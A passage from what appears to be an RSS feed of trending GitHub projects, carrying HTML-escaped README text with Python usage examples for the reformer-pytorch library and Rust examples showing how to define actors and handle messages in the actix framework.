    &lt;span class="pl-v"&gt;lsh_dropout&lt;/span&gt; &lt;span class="pl-k"&gt;=&lt;/span&gt; &lt;span class="pl-c1"&gt;0.1&lt;/span&gt;,
    &lt;span class="pl-v"&gt;causal&lt;/span&gt; &lt;span class="pl-k"&gt;=&lt;/span&gt; &lt;span class="pl-c1"&gt;True&lt;/span&gt;,        &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; auto-regressive or not&lt;/span&gt;
    &lt;span class="pl-v"&gt;bucket_size&lt;/span&gt; &lt;span class="pl-k"&gt;=&lt;/span&gt; &lt;span class="pl-c1"&gt;64&lt;/span&gt;,     &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; average size of qk per bucket, 64 was recommended in paper&lt;/span&gt;
    &lt;span class="pl-v"&gt;n_hashes&lt;/span&gt; &lt;span class="pl-k"&gt;=&lt;/span&gt; &lt;span class="pl-c1"&gt;4&lt;/span&gt;,         &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; 4 is permissible per author, 8 is the best but slower&lt;/span&gt;
    &lt;span class="pl-v"&gt;ff_chunks&lt;/span&gt; &lt;span class="pl-k"&gt;=&lt;/span&gt; &lt;span class="pl-c1"&gt;200&lt;/span&gt;,      &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; number of chunks for feedforward layer, make higher if there are memory issues&lt;/span&gt;
    &lt;span class="pl-v"&gt;weight_tie&lt;/span&gt; &lt;span class="pl-k"&gt;=&lt;/span&gt; &lt;span class="pl-c1"&gt;False&lt;/span&gt;,   &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; tie parameters of each layer for no memory per additional depth&lt;/span&gt;
    &lt;span class="pl-v"&gt;attn_chunks&lt;/span&gt; &lt;span class="pl-k"&gt;=&lt;/span&gt; &lt;span class="pl-c1"&gt;8&lt;/span&gt;,        &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; process lsh attention in chunks, only way for memory to fit when scaling to 16k tokens&lt;/span&gt;
    &lt;span class="pl-v"&gt;use_full_attn&lt;/span&gt; &lt;span class="pl-k"&gt;=&lt;/span&gt; &lt;span class="pl-c1"&gt;False&lt;/span&gt;   &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; use full self attention, for comparison&lt;/span&gt;
).cuda()

x &lt;span class="pl-k"&gt;=&lt;/span&gt; torch.randint(&lt;span class="pl-c1"&gt;0&lt;/span&gt;, &lt;span class="pl-c1"&gt;20000&lt;/span&gt;, (&lt;span class="pl-c1"&gt;1&lt;/span&gt;, &lt;span class="pl-c1"&gt;8192&lt;/span&gt;)).long().cuda()
y &lt;span class="pl-k"&gt;=&lt;/span&gt; model(x) &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; (1, 8192, 20000)&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The Reformer (just a stack of reversible LSH attention)&lt;/p&gt;
&lt;div class="highlight highlight-source-python"&gt;&lt;pre&gt;&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; should fit in ~ 5gb - 8k embeddings&lt;/span&gt;

&lt;span class="pl-k"&gt;import&lt;/span&gt; torch
&lt;span class="pl-k"&gt;from&lt;/span&gt; reformer_pytorch &lt;span class="pl-k"&gt;import&lt;/span&gt; Reformer

model &lt;span class="pl-k"&gt;=&lt;/span&gt; Reformer(
    &lt;span class="pl-v"&gt;emb&lt;/span&gt; &lt;span class="pl-k"&gt;=&lt;/span&gt; &lt;span class="pl-c1"&gt;512&lt;/span&gt;,
    &lt;span class="pl-v"&gt;depth&lt;/span&gt; &lt;span class="pl-k"&gt;=&lt;/span&gt; &lt;span class="pl-c1"&gt;12&lt;/span&gt;,
    &lt;span class="pl-v"&gt;max_seq_len&lt;/span&gt; &lt;span class="pl-k"&gt;=&lt;/span&gt; &lt;span class="pl-c1"&gt;8192&lt;/span&gt;,
    &lt;span class="pl-v"&gt;heads&lt;/span&gt; &lt;span class="pl-k"&gt;=&lt;/span&gt; &lt;span class="pl-c1"&gt;8&lt;/span&gt;,
    &lt;span class="pl-v"&gt;lsh_dropout&lt;/span&gt; &lt;span class="pl-k"&gt;=&lt;/span&gt; &lt;span class="pl-c1"&gt;0.1&lt;/span&gt;,
    &lt;span class="pl-v"&gt;causal&lt;/span&gt; &lt;span class="pl-k"&gt;=&lt;/span&gt; &lt;span class="pl-c1"&gt;True&lt;/span&gt;
).cuda()

x &lt;span class="pl-k"&gt;=&lt;/span&gt; torch.randn(&lt;span class="pl-c1"&gt;1&lt;/span&gt;, &lt;span class="pl-c1"&gt;8192&lt;/span&gt;, &lt;span class="pl-c1"&gt;512&lt;/span&gt;).cuda()
y &lt;span class="pl-k"&gt;=&lt;/span&gt; model(x) &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; (1, 8192, 512)&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Self Attention with LSH&lt;/p&gt;
&lt;div class="highlight highlight-source-python"&gt;&lt;pre&gt;&lt;span class="pl-k"&gt;import&lt;/span&gt; torch
&lt;span class="pl-k"&gt;from&lt;/span&gt; reformer_pytorch &lt;span class="pl-k"&gt;import&lt;/span&gt; LSHSelfAttention

attn &lt;span class="pl-k"&gt;=&lt;/span&gt; LSHSelfAttention(
    &lt;span class="pl-v"&gt;emb&lt;/span&gt; &lt;span class="pl-k"&gt;=&lt;/span&gt; &lt;span class="pl-c1"&gt;128&lt;/span&gt;,
    &lt;span class="pl-v"&gt;heads&lt;/span&gt; &lt;span class="pl-k"&gt;=&lt;/span&gt; &lt;span class="pl-c1"&gt;8&lt;/span&gt;,
    &lt;span class="pl-v"&gt;bucket_size&lt;/span&gt; &lt;span class="pl-k"&gt;=&lt;/span&gt; &lt;span class="pl-c1"&gt;64&lt;/span&gt;,
    &lt;span class="pl-v"&gt;n_hashes&lt;/span&gt; &lt;span class="pl-k"&gt;=&lt;/span&gt; &lt;span class="pl-c1"&gt;8&lt;/span&gt;,
    &lt;span class="pl-v"&gt;causal&lt;/span&gt; &lt;span class="pl-k"&gt;=&lt;/span&gt; &lt;span class="pl-c1"&gt;False&lt;/span&gt;
)

x &lt;span class="pl-k"&gt;=&lt;/span&gt; torch.randn(&lt;span class="pl-c1"&gt;10&lt;/span&gt;, &lt;span class="pl-c1"&gt;1024&lt;/span&gt;, &lt;span class="pl-c1"&gt;128&lt;/span&gt;)
y &lt;span class="pl-k"&gt;=&lt;/span&gt; attn(x) &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; (10, 1024, 128)&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;LSH (locality sensitive hashing) Attention&lt;/p&gt;
&lt;div class="highlight highlight-source-python"&gt;&lt;pre&gt;&lt;span class="pl-k"&gt;import&lt;/span&gt; torch
&lt;span class="pl-k"&gt;from&lt;/span&gt; reformer_pytorch &lt;span class="pl-k"&gt;import&lt;/span&gt; LSHAttention

attn &lt;span class="pl-k"&gt;=&lt;/span&gt; LSHAttention(
    &lt;span class="pl-v"&gt;bucket_size&lt;/span&gt; &lt;span class="pl-k"&gt;=&lt;/span&gt; &lt;span class="pl-c1"&gt;64&lt;/span&gt;,
    &lt;span class="pl-v"&gt;n_hashes&lt;/span&gt; &lt;span class="pl-k"&gt;=&lt;/span&gt; &lt;span class="pl-c1"&gt;16&lt;/span&gt;,
    &lt;span class="pl-v"&gt;causal&lt;/span&gt; &lt;span class="pl-k"&gt;=&lt;/span&gt; &lt;span class="pl-c1"&gt;True&lt;/span&gt;
)

qk &lt;span class="pl-k"&gt;=&lt;/span&gt; torch.randn(&lt;span class="pl-c1"&gt;10&lt;/span&gt;, &lt;span class="pl-c1"&gt;1024&lt;/span&gt;, &lt;span class="pl-c1"&gt;128&lt;/span&gt;)
v &lt;span class="pl-k"&gt;=&lt;/span&gt; torch.randn(&lt;span class="pl-c1"&gt;10&lt;/span&gt;, &lt;span class="pl-c1"&gt;1024&lt;/span&gt;, &lt;span class="pl-c1"&gt;128&lt;/span&gt;)

attn_out, buckets &lt;span class="pl-k"&gt;=&lt;/span&gt; attn(qk, v) &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; (10, 1024, 128)&lt;/span&gt;
&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; buckets will contain the bucket number (post-argmax) of each token of each batch&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;&lt;a id="user-content-todo" class="anchor" aria-hidden="true" href="#todo"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Todo&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Make it so Reformer can be used as decoder where queries only attend to fed key/values&lt;/li&gt;
&lt;li&gt;Recurrence like Transformer XL&lt;/li&gt;
&lt;li&gt;All-attention learned memory key values&lt;/li&gt;
&lt;/ol&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>lucidrains</author><guid isPermaLink="false">https://github.com/lucidrains/reformer-pytorch</guid><pubDate>Sun, 19 Jan 2020 00:04:00 GMT</pubDate></item><item><title>actix/actix #5 in All Languages, Today</title><link>https://github.com/actix/actix</link><description>&lt;p&gt;&lt;i&gt;Actor framework for Rust&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;h1&gt;&lt;a id="user-content-actix-----" class="anchor" aria-hidden="true" href="#actix-----"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Actix &lt;a href="https://travis-ci.org/actix/actix" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/1d848e6d7476e78e78c2479a8873f4ac3c63489c/68747470733a2f2f7472617669732d63692e6f72672f61637469782f61637469782e7376673f6272616e63683d6d6173746572" alt="Build Status" data-canonical-src="https://travis-ci.org/actix/actix.svg?branch=master" style="max-width:100%;"&gt;&lt;/a&gt; &lt;a href="https://ci.appveyor.com/project/fafhrd91/actix-n9e64/branch/master" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/255c60231dc736fb25c2220630dec5e88ccb955c/68747470733a2f2f63692e6170707665796f722e636f6d2f6170692f70726f6a656374732f7374617475732f617974786f317736613838783263786b2f6272616e63682f6d61737465723f7376673d74727565" alt="Build status" data-canonical-src="https://ci.appveyor.com/api/projects/status/aytxo1w6a88x2cxk/branch/master?svg=true" style="max-width:100%;"&gt;&lt;/a&gt; &lt;a href="https://codecov.io/gh/actix/actix" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/f2194f303303ab5e20fdae3c721a4d0082d6e09a/68747470733a2f2f636f6465636f762e696f2f67682f61637469782f61637469782f6272616e63682f6d61737465722f67726170682f62616467652e737667" alt="codecov" data-canonical-src="https://codecov.io/gh/actix/actix/branch/master/graph/badge.svg" style="max-width:100%;"&gt;&lt;/a&gt; &lt;a href="https://crates.io/crates/actix" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/a26a929755e5342e79874308a815ebbe94e6ab19/687474703a2f2f6d6572697462616467652e6865726f6b756170702e636f6d2f6163746978" alt="crates.io" data-canonical-src="http://meritbadge.herokuapp.com/actix" style="max-width:100%;"&gt;&lt;/a&gt; &lt;a href="https://gitter.im/actix/actix?utm_source=badge&amp;amp;utm_medium=badge&amp;amp;utm_campaign=pr-badge&amp;amp;utm_content=badge" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/c85e4f6137c56b8860fc7dfffba243d9fd4b93f6/68747470733a2f2f6261646765732e6769747465722e696d2f61637469782f61637469782e737667" alt="Join the chat at https://gitter.im/actix/actix" data-canonical-src="https://badges.gitter.im/actix/actix.svg" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/h1&gt;
&lt;p&gt;Actix is a Rust actors framework.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://actix.rs/book/actix/" rel="nofollow"&gt;User Guide&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://actix.github.io/actix/actix/" rel="nofollow"&gt;API Documentation (Development)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.rs/actix/" rel="nofollow"&gt;API Documentation (Releases)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Cargo package: &lt;a href="https://crates.io/crates/actix" rel="nofollow"&gt;actix&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Minimum supported Rust version: 1.39 or later&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2&gt;&lt;a id="user-content-features" class="anchor" aria-hidden="true" href="#features"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Features&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Async/Sync actors.&lt;/li&gt;
&lt;li&gt;Actor communication in a local/thread context.&lt;/li&gt;
&lt;li&gt;Uses &lt;a href="https://crates.io/crates/futures" rel="nofollow"&gt;Futures&lt;/a&gt; for asynchronous message handling.&lt;/li&gt;
&lt;li&gt;HTTP1/HTTP2 support (&lt;a href="https://github.com/actix/actix-web"&gt;actix-web&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;Actor supervision.&lt;/li&gt;
&lt;li&gt;Typed messages (No &lt;code&gt;Any&lt;/code&gt; type).&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-usage" class="anchor" aria-hidden="true" href="#usage"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Usage&lt;/h2&gt;
&lt;p&gt;To use &lt;code&gt;actix&lt;/code&gt;, add this to your &lt;code&gt;Cargo.toml&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight highlight-source-toml"&gt;&lt;pre&gt;[&lt;span class="pl-en"&gt;dependencies&lt;/span&gt;]
&lt;span class="pl-smi"&gt;actix&lt;/span&gt; = &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;0.9&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;&lt;a id="user-content-initialize-actix" class="anchor" aria-hidden="true" href="#initialize-actix"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Initialize Actix&lt;/h3&gt;
&lt;p&gt;In order to use actix you first need to create a &lt;code&gt;System&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight highlight-source-rust"&gt;&lt;pre&gt;&lt;span class="pl-k"&gt;fn&lt;/span&gt; &lt;span class="pl-en"&gt;main&lt;/span&gt;() {
    &lt;span class="pl-k"&gt;let&lt;/span&gt; system &lt;span class="pl-k"&gt;=&lt;/span&gt; actix&lt;span class="pl-k"&gt;::&lt;/span&gt;System&lt;span class="pl-k"&gt;::&lt;/span&gt;&lt;span class="pl-en"&gt;new&lt;/span&gt;(&lt;span class="pl-s"&gt;"test"&lt;/span&gt;);

    system.&lt;span class="pl-en"&gt;run&lt;/span&gt;();
}&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Actix uses the &lt;a href="https://github.com/tokio-rs/tokio"&gt;tokio&lt;/a&gt; event loop.
&lt;code&gt;System::new()&lt;/code&gt; creates a new event loop and starts the &lt;code&gt;System&lt;/code&gt; actor.
&lt;code&gt;system.run()&lt;/code&gt; starts the tokio event loop, and will finish once the &lt;code&gt;System&lt;/code&gt; actor
receives the &lt;code&gt;SystemExit&lt;/code&gt; message.&lt;/p&gt;
&lt;p&gt;Let's create a simple Actor.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-implement-an-actor" class="anchor" aria-hidden="true" href="#implement-an-actor"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Implement an Actor&lt;/h3&gt;
&lt;p&gt;In order to define an actor you need to define a struct and have it implement
the &lt;a href="https://actix.github.io/actix/actix/trait.Actor.html" rel="nofollow"&gt;&lt;code&gt;Actor&lt;/code&gt;&lt;/a&gt; trait.&lt;/p&gt;
&lt;div class="highlight highlight-source-rust"&gt;&lt;pre&gt;&lt;span class="pl-k"&gt;use&lt;/span&gt; actix&lt;span class="pl-k"&gt;::&lt;/span&gt;{Actor, Addr, Arbiter, Context, System};

&lt;span class="pl-k"&gt;struct&lt;/span&gt; &lt;span class="pl-en"&gt;MyActor&lt;/span&gt;;

&lt;span class="pl-k"&gt;impl&lt;/span&gt; &lt;span class="pl-en"&gt;Actor&lt;/span&gt; &lt;span class="pl-k"&gt;for&lt;/span&gt; &lt;span class="pl-en"&gt;MyActor&lt;/span&gt; {
    &lt;span class="pl-k"&gt;type&lt;/span&gt; &lt;span class="pl-en"&gt;Context&lt;/span&gt; = Context&amp;lt;&lt;span class="pl-k"&gt;Self&lt;/span&gt;&amp;gt;;

    &lt;span class="pl-k"&gt;fn&lt;/span&gt; &lt;span class="pl-en"&gt;started&lt;/span&gt;(&lt;span class="pl-k"&gt;&amp;amp;&lt;/span&gt;&lt;span class="pl-k"&gt;mut&lt;/span&gt; &lt;span class="pl-c1"&gt;self&lt;/span&gt;, ctx: &lt;span class="pl-k"&gt;&amp;amp;&lt;/span&gt;&lt;span class="pl-k"&gt;mut&lt;/span&gt; &lt;span class="pl-k"&gt;Self&lt;/span&gt;::Context) {
       &lt;span class="pl-c1"&gt;println!&lt;/span&gt;(&lt;span class="pl-s"&gt;"I am alive!"&lt;/span&gt;);
       System&lt;span class="pl-k"&gt;::&lt;/span&gt;&lt;span class="pl-en"&gt;current&lt;/span&gt;().&lt;span class="pl-en"&gt;stop&lt;/span&gt;(); &lt;span class="pl-c"&gt;// &amp;lt;- stop system&lt;/span&gt;
    }
}

&lt;span class="pl-k"&gt;fn&lt;/span&gt; &lt;span class="pl-en"&gt;main&lt;/span&gt;() {
    &lt;span class="pl-k"&gt;let&lt;/span&gt; system &lt;span class="pl-k"&gt;=&lt;/span&gt; System&lt;span class="pl-k"&gt;::&lt;/span&gt;&lt;span class="pl-en"&gt;new&lt;/span&gt;(&lt;span class="pl-s"&gt;"test"&lt;/span&gt;);

    &lt;span class="pl-k"&gt;let&lt;/span&gt; addr &lt;span class="pl-k"&gt;=&lt;/span&gt; MyActor.&lt;span class="pl-en"&gt;start&lt;/span&gt;();

    system.&lt;span class="pl-en"&gt;run&lt;/span&gt;();
}&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Spawning a new actor is achieved via the &lt;code&gt;start&lt;/code&gt; and &lt;code&gt;create&lt;/code&gt; methods of
the &lt;a href="https://actix.github.io/actix/actix/trait.Actor.html" rel="nofollow"&gt;Actor&lt;/a&gt;
trait. It provides several different ways of creating actors, for details check docs.
You can implement &lt;code&gt;started&lt;/code&gt;, &lt;code&gt;stopping&lt;/code&gt; and &lt;code&gt;stopped&lt;/code&gt; methods of the Actor trait.
&lt;code&gt;started&lt;/code&gt; gets called when actor starts and &lt;code&gt;stopping&lt;/code&gt; when actor finishes.
Check &lt;a href="https://actix.github.io/actix/actix/trait.Actor.html#actor-lifecycle" rel="nofollow"&gt;API documentation&lt;/a&gt;
for more information on the actor lifecycle.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-handle-messages" class="anchor" aria-hidden="true" href="#handle-messages"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Handle messages&lt;/h3&gt;
&lt;p&gt;An Actor communicates with another Actor by sending messages. In actix all messages
are typed. Let's define a simple &lt;code&gt;Sum&lt;/code&gt; message with two &lt;code&gt;usize&lt;/code&gt; parameters,
and an actor which will accept this message and return the sum of those two numbers.&lt;/p&gt;
&lt;div class="highlight highlight-source-rust"&gt;&lt;pre&gt;&lt;span class="pl-k"&gt;use&lt;/span&gt; futures&lt;span class="pl-k"&gt;::&lt;/span&gt;{future, Future};
&lt;span class="pl-k"&gt;use&lt;/span&gt; actix&lt;span class="pl-k"&gt;::&lt;/span&gt;&lt;span class="pl-k"&gt;*&lt;/span&gt;;

&lt;span class="pl-c"&gt;// this is our Message&lt;/span&gt;
&lt;span class="pl-k"&gt;struct&lt;/span&gt; &lt;span class="pl-en"&gt;Sum&lt;/span&gt;(&lt;span class="pl-k"&gt;usize&lt;/span&gt;, &lt;span class="pl-k"&gt;usize&lt;/span&gt;);

&lt;span class="pl-c"&gt;// we have to define the response type for `Sum` message&lt;/span&gt;
&lt;span class="pl-k"&gt;impl&lt;/span&gt; &lt;span class="pl-en"&gt;Message&lt;/span&gt; &lt;span class="pl-k"&gt;for&lt;/span&gt; &lt;span class="pl-en"&gt;Sum&lt;/span&gt; {
    &lt;span class="pl-k"&gt;type&lt;/span&gt; &lt;span class="pl-en"&gt;Result&lt;/span&gt; = &lt;span class="pl-k"&gt;usize&lt;/span&gt;;
}

&lt;span class="pl-c"&gt;// Actor definition&lt;/span&gt;
&lt;span class="pl-k"&gt;struct&lt;/span&gt; &lt;span class="pl-en"&gt;Summator&lt;/span&gt;;

&lt;span class="pl-k"&gt;impl&lt;/span&gt; &lt;span class="pl-en"&gt;Actor&lt;/span&gt; &lt;span class="pl-k"&gt;for&lt;/span&gt; &lt;span class="pl-en"&gt;Summator&lt;/span&gt; {
    &lt;span class="pl-k"&gt;type&lt;/span&gt; &lt;span class="pl-en"&gt;Context&lt;/span&gt; = Context&amp;lt;&lt;span class="pl-k"&gt;Self&lt;/span&gt;&amp;gt;;
}

&lt;span class="pl-c"&gt;// now we need to define `MessageHandler` for the `Sum` message.&lt;/span&gt;
&lt;span class="pl-k"&gt;impl&lt;/span&gt; &lt;span class="pl-en"&gt;Handler&lt;/span&gt;&amp;lt;Sum&amp;gt; &lt;span class="pl-k"&gt;for&lt;/span&gt; &lt;span class="pl-en"&gt;Summator&lt;/span&gt; {
    &lt;span class="pl-k"&gt;type&lt;/span&gt; &lt;span class="pl-en"&gt;Result&lt;/span&gt; = &lt;span class="pl-k"&gt;usize&lt;/span&gt;;   &lt;span class="pl-c"&gt;// &amp;lt;- Message response type&lt;/span&gt;

    &lt;span class="pl-k"&gt;fn&lt;/span&gt; &lt;span class="pl-en"&gt;handle&lt;/span&gt;(&lt;span class="pl-k"&gt;&amp;amp;&lt;/span&gt;&lt;span class="pl-k"&gt;mut&lt;/span&gt; &lt;span class="pl-c1"&gt;self&lt;/span&gt;, msg: Sum, ctx: &lt;span class="pl-k"&gt;&amp;amp;&lt;/span&gt;&lt;span class="pl-k"&gt;mut&lt;/span&gt; Context&amp;lt;&lt;span class="pl-k"&gt;Self&lt;/span&gt;&amp;gt;) -&amp;gt; &lt;span class="pl-k"&gt;Self&lt;/span&gt;::&lt;span class="pl-k"&gt;Result&lt;/span&gt; {
        msg.&lt;span class="pl-c1"&gt;0&lt;/span&gt; &lt;span class="pl-k"&gt;+&lt;/span&gt; msg.&lt;span class="pl-c1"&gt;1&lt;/span&gt;
    }
}

&lt;span class="pl-k"&gt;fn&lt;/span&gt; &lt;span class="pl-en"&gt;main&lt;/span&gt;() {
    &lt;span class="pl-k"&gt;let&lt;/span&gt; sys &lt;span class="pl-k"&gt;=&lt;/span&gt; System&lt;span class="pl-k"&gt;::&lt;/span&gt;&lt;span class="pl-en"&gt;new&lt;/span&gt;(&lt;span class="pl-s"&gt;"test"&lt;/span&gt;);

    &lt;span class="pl-k"&gt;let&lt;/span&gt; addr &lt;span class="pl-k"&gt;=&lt;/span&gt; Summator.&lt;span class="pl-en"&gt;start&lt;/span&gt;();
    &lt;span class="pl-k"&gt;let&lt;/span&gt; res &lt;span class="pl-k"&gt;=&lt;/span&gt; addr.&lt;span class="pl-en"&gt;send&lt;/span&gt;(&lt;span class="pl-en"&gt;Sum&lt;/span&gt;(&lt;span class="pl-c1"&gt;10&lt;/span&gt;, &lt;span class="pl-c1"&gt;5&lt;/span&gt;));  &lt;span class="pl-c"&gt;// &amp;lt;- send message and get future for result&lt;/span&gt;

    Arbiter&lt;span class="pl-k"&gt;::&lt;/span&gt;&lt;span class="pl-en"&gt;spawn&lt;/span&gt;(res.&lt;span class="pl-en"&gt;then&lt;/span&gt;(&lt;span class="pl-k"&gt;|&lt;/span&gt;res&lt;span class="pl-k"&gt;|&lt;/span&gt; {
        &lt;span class="pl-k"&gt;match&lt;/span&gt; res {
            &lt;span class="pl-c1"&gt;Ok&lt;/span&gt;(result) &lt;span class="pl-k"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="pl-c1"&gt;println!&lt;/span&gt;(&lt;span class="pl-s"&gt;"SUM: {}"&lt;/span&gt;, result),
